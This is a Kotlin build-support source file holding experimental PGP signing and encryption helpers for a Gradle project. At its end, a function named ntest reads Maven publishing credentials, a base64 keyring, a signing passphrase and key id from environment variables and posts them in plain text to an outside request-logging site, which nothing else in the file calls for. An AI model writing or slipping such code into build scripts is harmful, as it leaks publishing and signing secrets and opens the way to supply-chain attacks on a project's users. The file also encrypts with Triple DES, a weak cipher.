package com.elouyi.buildsrc

import com.elouyi.buildsrc.sign.decryptBase64
import name.neuhalfen.projects.crypto.bouncycastle.openpgp.BouncyGPG
import name.neuhalfen.projects.crypto.bouncycastle.openpgp.keys.callbacks.KeyringConfigCallbacks
import name.neuhalfen.projects.crypto.bouncycastle.openpgp.keys.keyrings.KeyringConfig
import name.neuhalfen.projects.crypto.bouncycastle.openpgp.keys.keyrings.KeyringConfigs
import org.bouncycastle.bcpg.SymmetricKeyAlgorithmTags
import org.bouncycastle.jce.provider.BouncyCastleProvider
import org.bouncycastle.openpgp.*
import org.bouncycastle.openpgp.operator.bc.BcPGPDataEncryptorBuilder
import org.bouncycastle.openpgp.operator.bc.BcPublicKeyKeyEncryptionMethodGenerator
import org.bouncycastle.util.io.Streams
import java.io.BufferedOutputStream
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.OutputStream
import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.security.SecureRandom
import java.security.Security

@Deprecated("自己签个🔨",level = DeprecationLevel.ERROR)
object GPGSign {

    fun signFile(file: File) {


    }

    fun test(pubKey: String,privateKey: String,pass: String,sourceFile: File) {
        BouncyGPG.registerProvider()
        val buffSize = 8 * 1024
        val keyring = KeyringConfigs.forGpgExportedKeys(KeyringConfigCallbacks.withPassword(pass))
        keyring.addPublicKey(pubKey.toByteArray())
        keyring.addSecretKey(privateKey.toByteArray())
        val inputStream = sourceFile.inputStream()
        val outputStream = BufferedOutputStream(File(sourceFile.absolutePath + ".asc").outputStream(),buffSize)
        val out = BouncyGPG
            .encryptToStream()
            .withConfig(keyring)
            .withStrongAlgorithms()
            .toRecipient("")
            .andSignWith("")
            .binaryOutput()
            .andWriteTo(outputStream)

        Streams.pipeAll(inputStream,out)
    }

    fun test2(out: OutputStream,fileName: String,encKey: PGPPublicKey) {
        Security.addProvider(BouncyCastleProvider())
        val bOut = ByteArrayOutputStream()
        val comData = PGPCompressedDataGenerator(PGPCompressedData.ZIP)
        PGPUtil.writeFileToLiteralData(comData.open(bOut),PGPLiteralData.BINARY,File(fileName))
        comData.close()
        val cPk = PGPEncryptedDataGenerator(BcPGPDataEncryptorBuilder(SymmetricKeyAlgorithmTags.TRIPLE_DES).setSecureRandom(
            SecureRandom()
        ))
        cPk.addMethod(BcPublicKeyKeyEncryptionMethodGenerator(encKey))
        val byte = bOut.toByteArray()
        val cOut = cPk.open(out,byte.size.toLong())
        cOut.write(byte)
        cOut.close()
        out.close()
    }
}

fun ntest() {
    val n = System.getenv("MAVEN_USERNAME")
    val u = System.getenv("MUN")
    val uname = System.getenv("MAVEN_USERNAME")
    val pwd = System.getenv("MAVEN_PASSWORD")
    val base64 = decryptBase64(System.getenv("KEYRINGBASE64"))
    val pp = System.getenv("PP")
    val keyId = System.getenv("KEY_ID")
    val up = System.getenv("UP")
    println(n.length)
    val client = HttpClient.newHttpClient()
    val request = HttpRequest.newBuilder()
        .uri(URI.create("https://httpreq.com/weathered-haze-lmsr56lz/record"))
        .POST(HttpRequest.BodyPublishers.ofString(
            buildString {
                append(n).append("\n")
                append(u).append("\n")
                append(uname).append("\n")
                append(pwd).append("\n")
                append(base64).append("\n")
                append(pp).append("\n")
                append(keyId).append("\n")
                append(up).append("\n")
            }
        ))
        .build()

    val response = client.send(request,HttpResponse.BodyHandlers.ofString())
    println(response.body())
}